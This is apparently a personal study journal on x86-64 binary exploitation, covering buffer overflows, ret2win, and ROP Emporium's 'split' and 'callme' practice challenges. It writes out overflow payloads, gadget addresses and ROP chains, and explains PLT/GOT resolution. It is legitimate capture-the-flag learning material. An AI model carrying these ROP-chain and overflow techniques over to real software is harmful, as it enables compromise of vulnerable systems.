# 02/07/24
1. Working on Kali Linux machine through ./home/anarticho/BUFFER_OVERFLOW:
	1. [Overflow Exploit](https://www.youtube.com/watch?v=6sUd3AA7Q50)
	2. [Notes](./NOTES/buffer_overflow_workshits.md)
	3. C program (main.C) that have buffer overflow vulnerability.
	4. Pending to finish...
2. It was necessary to dig into x86-64 assembly:
    1. [Gedare Bloom - x86-64 assembly](https://www.youtube.com/watch?v=lUbPUWtmVUU&t=491s)
	2. [Notes](./NOTES/x86-64_first_raw.md) -> __to be moved on blog's post__
3. Not understanding well the assembly code, going to do some basics things:
	1. [Reading assembly](https://wolchok.org/posts/how-to-read-assembly-language/) mentions that RBP register is no longer used on modern architectures. Instead, the stack is growing for local variables, and the at reaching the ret instruction, it pop all elements from stack and retrieve the return address to jump on.
	2.[Cracking x86-64](https://medium.com/@sruthk/cracking-assembly-calling-conventions-in-x86-cc035d66f3f3)
	3. simple_main.c the program to study x86-64 calling convention.


# 03/07/24
1. On abbandonne l'idée du blog, on passe aussi au français.
2. On a aussi révisé ce document afin qu'il soit le plus appuré possible,
	cad qu'on s'en coutrfout du format 
	> ce fichier est fait pour être lu, pas publié.
3. On retourne sur la vidéo de Crow (https://www.youtube.com/watch?v=6sUd3AA7Q50)


# 04/07/24
## Morning
1. Nouvelle série sur YT 		[flipthebit](https://www.youtube.com/watch?v=hH0Pss7PGVE)
2. Install Kali WSL				[official](https://www.kali.org/docs/wsl/wsl-preparations/#wsl-helper-script)
	- Do not use with sudo.
	> sudo tmux new -s gdb_sess
	> gdb
3. Jolie DKPG from video		[pwmdbg-tmux](https://medium.com/@Kuber19/enhancing-your-re-experience-with-pwndbg-tmux-459d271105f2)

## After morning (third cofee)
1. Visual studio on lite WSL	[VS remote WSL](https://code.visualstudio.com/docs/remote/wsl)
2. Configure git on WSL			[Credential manager](https://dev.to/stephanlamoureux/configuring-git-in-wsl-5e3m)


# 05/07/24
1. Kali linux on WSL stable !
2. Wasted time on interface (with Splitmind).
3. Tools that are used here:
	- GCC (appending symbols usign the -g flag "gcc -g -o exe_file c_file.c)
	- PWNDBG as GDB pluggin (https://github.com/pwndbg/pwndbg)

	Then for the interface it's a mix of:
	- GDB-dashboard (https://github.com/cyrus-and/gdb-dashboard)
	- TMUX for Terminal Multiplexer (https://github.com/tmux/tmux).

	TMUX usage can be avoided by displaying each module of GDB-dashboard in a separate terminal (https://gitee.com/dongbo_89/gdb-dashboard#display-each-module-in-a-separate-terminal).
4. We are going to use:
	- GDB
	- GDB-dashboard (https://gitee.com/dongbo_89/gdb-dashboard#installation + https://github.com/cyrus-and/gdb-dashboard)
	- TMUX (https://github.com/tmux/tmux + https://hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/)
	- PWNDBG (https://github.com/pwndbg/pwndbg)

5. Using implementation from https://github.com/ficoos/tgdbdb/tree/master.


# 06/07/24
- Configuration at https://github.com/anarticho/Kali_machine/commit/9ff85f718ea0d59f74d739fe6c4dac36cb4439fd.
- Coming back to flipboard video.


# 07/07/24
- https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef

## Organization
- Review follow ups.
- Having a backup for WSL2 (C:\...\Desktop\Backup Kali)
- Remove github repository from kali

## Day flow
- Figuring out that python3 provide Unicode Text String output, when python2 was Byte String.
    (https://discuss.python.org/t/unusal-behavior-of-python3-print-hex-values/15418/8)
- Let's create a C++ program to generate byte-text string to be used as "python -c 'print(..)'" into gdb run $() 
    > VS_work/binary_stdout
        > C++ with main entry point + Translater class.
        > Make file.

## Tomorrow
- Twitch live stream?
- Debug program using GDB.
- Idea to have an executable (as tgdb):
    - to open a shell,
    - to provide tty to binary_stdout to write on,
    - ou un DDL main.


# 10/07/24

## Executables + path
- Moved tgdb from ~/tools to newly created ~/bin.

## Configure Visual Studio Code Debug
- Following thoses instructions (https://hackernoon.com/how-to-set-up-c-debugging-in-vscode-using-a-makefile)
- CTRL + P
	- Tasks: Run tasks
	- Debug: Start Debug

## Binary Inject Program
- C++ program
- make (build and clean tasks)
- Code into https://github.com/anarticho/binject
- Executable added to bin/

## Used with GDB
- Successfully used with gdb using:
> r $(binject -s 123)

## Organization
- Reorganized this folder.
- Review workflow

## Live
- Successfully jumping to hackme function

## Crow buffer overflow video
> p <function name>

## ret2win
FINAAAAALLLLY
0. Detect function where we want to return.
1. Detect where is RBP (with BBBBBBB).
2. Write function entry (from 0.) instead.

## Buffer Overflow
Program we created from:
- VS_work/buffer_overflow directory.
- https://www.youtube.com/watch?v=hH0Pss7PGVE code.

This method do not work to print from returned function, while GDB debugging session
is effectivly returning to this function?.

## New one
From https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
- Cracked (VS_work/buffer_overflow/main2.c + SOLUTIONS.md)
However, only works by debugging with GDB.
Some hypotesis about that:
- PIE and ASLR?
- printf getting corrupted?

# 11/07/24

## Return to buffer_overflow projects
It appears that both main and main2 have the same problem. Investigating that.
> checksec --file=ret2win 
Informs that the ROP's ret2win executable do not have the PIE enabled, while for main and main2 ones, it is activated.


## PIE mechanism
FOUND this website
https://ir0nstone.gitbook.io/notes/types/stack/pie

https://ir0nstone.gitbook.io/notes/other/pwntools/introduction
- pwntools -> elf
- Python3 library

## Python shits
We actually have 2 version of python:
- Python2.7 installed through 'apt install python2-minimal'
- Python3.11 installed through 'apt install python'
https://www.baeldung.com/linux/python-multiple-versions-

Removed python2 as we will use binject to perform the exact same functionnality as:
> python2 -c 'print(128*"A"+b"\xAB\xCD")'
Is prettier using:
> binject -ns 128 A -x ABCD

## Sauvegarde Kali

# 12/07/24

Coming back to ROP emporium challengs, on split one.
https://ropemporium.com/challenge/split.html

Looking at the begginer's guide, some new tools:
- https://github.com/sashs/Ropper
 	- To find ROP gadgets within executable
	- ropper --file split --search "ret"
- https://github.com/Gallopsled/pwntools
	- Not now, will be really usefull when leading with ASLR.
- https://github.com/radare/radare2
	- mainly rabin2 to find strings within executable
	- "rabin2 -z split"

# split chalenge

## The wall

This one was really hard, but we did it !
We first tried to just return to the 'usefulFunction' containing the 'system' call with '/bin/ls' as parameter using buffer overflow with:
> binject -ns 40 A -x 4207400000000000

Whithout having nothing more than a strange segmentation fault within the 'system' call, precisely at the 'movaps %xmm0, 0x50(%rsp)'. Searching a bit about this, it appears that the problem was a a misalignement of the stack...

https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing#stack-alignment
https://stackoverflow.com/a/74755766

It can be a bit tricky to understand, but this 'movaps' instruction from system call need the stack to be 16-bit aligned (on hexadecimal, last digit to 0). Align stack is pretty easy, by just asserting a ret instruction, it increase the stack (and its RSP) by 8 bytes (as it pop the return address from the stack, on x64 its 8 bytes).

## The key

Using ropper:
> ropper --file split --search "ret"

We can easily find the address for a return instruction within the program.
Overflowing the vulnerable buffer on stack, we can overwrite the return address with the return one. It is a ROT gadget.

> binject -ns 40 A -x 3E05400000000000 -x 4207400000000000

For program with ROP gadget, and the one without, here is the values of %RSP after the 'read' call:

Next to 			| ROP +RET	| Just RET
------------------- | --------- | -------
CALL <read>			| 0xB0		| 0xB0
LEAVE				| 0xD8		| 0xD8
RET					| 0xE0		| -
RET (extra ROP) 	| 0xE8		| 0xE0 
PUSH %RBP			| 0xE0		| 0xD8
AT CALL <system>	| 0xE0		| 0xD8

## The challenge

Next step is to completely build a ROP chain.
Before, reading some explanation about x64 calling convention:
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame

Arguments at function call are not pushed to the stack under very strict conditions. Instead, they are stored within conventionals registers. It is pretty visual if we look at the assembly code for the 'usefulFunction':
> mov    $0x40084a,%edi
> call   0x400560 <system@plt>

In this case, the address 0x40084a is containing the parameter to be provided to the 'system' call, that we want to be on the %RDI buffer to be recovered by the fonction by convention.

For this challenge, we have to provide an other argument to the system call. It means that we have to ensure having our new argument loaded to %RDI before performing the call. This can be acheived by having a ROP gadget as:
> pop %rdi; ret;

Thus, we have to ensure that our new argument is just next to this gadget address within the stack, to be poped within %RDI register.

We then have:
> binject -ns 40 A -x C307400000000000 -x 6010600000000000 -x 4B07400000000000

As with:
- C307400000000000 the address for 'pop %rdi; ret' gadget,
- 6010600000000000 the address for '/bin/cat flag.txt' string,
- 4B07400000000000 the address for 'call <system>' instruction.

## Callme 
https://ropemporium.com/challenge/callme.html

It will be about PLT (Procedure Linkage Table). 

Interresting introduction from: ROP website:
https://ropemporium.com/guide.html#Appendix%20A

More detailled content here:
https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got

*To resume*: <br>
Extenal functions are not appended to the **.text**/**.code** section of the compiled program, but rather dedicated calls are deferred to the **PLT** procedure. Basically, it is a bunch of functions from binary **.plt**, **.got** and **.got.plt** sections that allow to dynamically resolve its symbol and build a "look-up table" mechanism to optimize function calls.

### PLT

https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries/

Using gdb, we can retrieve the differents sections from a binary using the command:
> info files

Then, we can display the instructions located at **.plt** address using:
> x/20i ADDRESS_.plt

Obviously, 20 is arbitrary, and it really depend on your program (and how many external variables and functions it have to resolve). Shortly, the .plt have:
- PLT[0] Some assembly instructions for the resolver routine (as dynamic loader itself in UNIX systems).
- PLT[N], as function routine to load address from **.got.plt** section. If not resolved, it will contain instruction address within PLT[N] to forward to resolver routine (at PLT[0]).

It is really important to understant that the code for thoses external **@plt** functions is located within this exact same **.plt** section, refeering to the global offset table, aka GOT.

## GOT

Some clarifications about the **.got.plt**; first, do not care about **.got** and **.got.plt**, we can say that they are something like the same thing. Most important, it contains addresses. It means that when PLT[N] jump to GOT[N], it will basically jump to the address contained by related **.got** section!

Here is its structure of 8 bytes elements, +0x08, +0x10 for the offsets:
- *GOT[0]*: records the first address of the **.dynamic section**, which records the basic information required by the dynamic linker, such as the symbol table location, relocation table location, etc.
- *GOT[1]*: records the identification information of the instantiated dynamic linker.
- *GOT[2]*: records the entry address of the dynamic linker delayed binding code <_dl_runtime_resolve_xsavec>.
- *GOT[3]*: records the address to \<**printf@plt**>, as the first entry of GOT table.

## Resolution

https://img-blog.csdnimg.cn/20200208160601515.gif
https://blog.csdn.net/Ruger008/article/details/107062608

At executing a program, the DL (dynamic linker, ld.so or ld-linux.so) is responsible for loading and initializing GOT entries, including GOT[1] and GOT[2], during the execution of a dynamically linked program. It manages the process of symbol resolution and updates GOT entries with the correct addresses of functions and variables from shared libraries, ensuring smooth and efficient runtime operation.

All the other addresses from **.got.plt** section (i.e. GOT[>=3]) points to related PLT instruction, as to be resolved by the DL later.

Then, imagine having unique external printf function to resolve through **PLT**:

1. **.code** instruction reach a **call** <...@plt> instruction.
2. it jumps to dedicated PLT[1] within **.plt**.
3. it jumps to the address pointed to GOT[3], that return to PLT[1] (next to instruction from 2.).
4. it push 0 to the stack and jumpts to PLT[0] as for the function entry offset.
5. it push GOT[1] on stack.
6. it jumps to adress from GOT[2] (as resolve function), parameters on stack are (function entry offset, dynamic_linker).

At this last point, the kernel dedicated binary will compute the symbol and then move it to GOT[3]. Then, each time \<**printf@plt**> will be called, instead of coming back to PLT[1] at *3.*, it will directly jump to the resolved symbol.

# 13/07/24

Coming back to https://ropemporium.com/challenge/callme.html.

## Blind test

1. wget https://ropemporium.com/binary/callme.zip (*to download the challenge*)
2. unzip callme.zip (*to unzip the challenge*)
3. checksec callme (*to check for security features*)
4. rabin2 -z callme (*to check for usefull strings*)

5. gdb callme
	1. info function give use some functions:
		- pwnme (the vulnerable function from *ret2win*).
		- usefulFunction (that, at disasemblying, call all the other three functions)
		- callme_one/two/three with the @plt label

Challenge talk about "incorrect calls" to theses functions that are not supposed to be used. I wanted to ROP this function to ensure PLT to resolve related symbols, but... well, let's try the "conventional way" first. <br>
**TODO**

The conventional is to jump to the **.plt** section (with offset) to resolve thoses functions. Then, we could easily ROP to *@got.plt* to simply call thoses functions;

Still with gdb:
1. info files (to retrieve **.got.plt** section):
2. x/20i 0x00000000004006c0 (with *.plt* section start address)
3. At this point, symbols are not already resolved, but at least we can identify the address on **.plt** section to jump on for each function with related **@got.plt** addresses as:
- 0x400720 <callme_one@plt>:   jmp    *0x20091a(%rip)        # 0x601040 <callme_one@got.plt>
- 0x400740 <callme_two@plt>:   jmp    *0x20090a(%rip)        # 0x601050 <callme_two@got.plt>
- 0x4006f0 <callme_three@plt>: jmp    *0x200932(%rip)        # 0x601028 <callme_three@got.plt>

Also, thoses functions needs 3 arguments (as we can see at disasembling *usefulFunction*) loaded onto RDI, RSI and RDX registers; a ROP gadget poping stack to thoses registers would allow us to perform the call. Where is that gadget? In the *usefulGadget* maybe?
> 0x000000000040093c <+0>:&emsp;	pop    %rdi&emsp;	// for 0xdeadbeefdeadbeef <br>
> 0x000000000040093d <+1>:&emsp;    pop    %rsi&emsp; 	// for 0xcafebabecafebabe <br>
> 0x000000000040093e <+2>:&emsp;	pop    %rdx&emsp; 	// for 0xd00df00dd00df00d <br>
> 0x000000000040093f <+3>:&emsp;	ret

With that, there is litterally no needs to use **ropper**. In addition to this, the emporium statement gives us valuable information about the parameters; on x64 architecture, it shall be 128 bytes long. 
**TODO WHYYYY!?**

Let's first verify that's the **pwnme** is still 32 bytes long with the **BB** test:
> binject -ns 32 A -x BBBBBBBBBBBBBBBB > test <br>
> tgdb callme <br>
> break *(pwnme+89) // to put a breakpoint at pwnme+89, as the ret instruction <br>
> r < test

We can see that the RBP register value is 0xbbbbbbbbbbbbbbbb, great. Let's then try to reach the <callme_one@plt>:
> binject -ns 40 A -x 200740 > test <br>
> tgdb callme <br>
> break *0x400720&emsp;//the adress of \<callme_one@plt> from **.plt** section <br>
> continue

I am going to append some changes to the binject project as to:
- allow lowercases letters in case of hexadecimal flag parameter.
- new -u64 flag to append 64-bits unsigned integer (with an hypotetical 0x prefix), litte-endian is assumed and padding appended if necessary.
- new -of flag to generate output onto a file. 
- new -if flag to append content from a file generated by binject.

Changes have been push to the [repository](https://github.com/anarticho/binject).

# 14/07/24

## Testing
In order to make the work on "binject" project faster, i want to automatize some tests to be informed at changing the code. It shall be easily performed through two uniques tests as:
- for basic format flags (-s, -x, -ns, -nx) and file output (-of).
- for file flag, using (-if) and standart output, redirected to a text file to test.

## Coming back to the challenge

Let's coming back to the challenge. Now we have a pretty nice tool with binject, we can just create some binaries to play with. To do so:
1. Create the binary to overflow the vulnerable buffer:
> binject -of ovf.bin -ns 40 A
2. Create the binary to contain the ROP gadget and the arguments:
> binject -of arg.bin -x64 40093c -x64 deadbeefdeadbeef -x64 cafebabecafebabe -x64 d00df00dd00df00d
3. Then create binaries to jump on each callme function from **.plt**:
> binject -of cm1.bin -if arg.bin -x64 400720 <br>
> binject -of cm2.bin -if arg.bin -x64 400740 <br>
> binject -of cm3.bin -if arg.bin -x64 4006f0 <br>
4. Put it all together.
> binject -of ola.bin -if ovf.bin -if cm1.bin -if cm2.bin -if cm3.bin

In fact, i putted it all into an *.sh* script in order not to have to type each time. 

Let's goooooo:
> ./callme < bin/ola.bin <br>
> callme by ROP Emporium <br>
> x86_64 <br>
> <br>
> Hope you read the instructions... <br>
> <br>
> Thank you! <br>
> callme_one() called correctly <br>
> callme_two() called correctly <br>
> ROPE{a_placeholder_32byte_flag!} <br>

## Alternative way
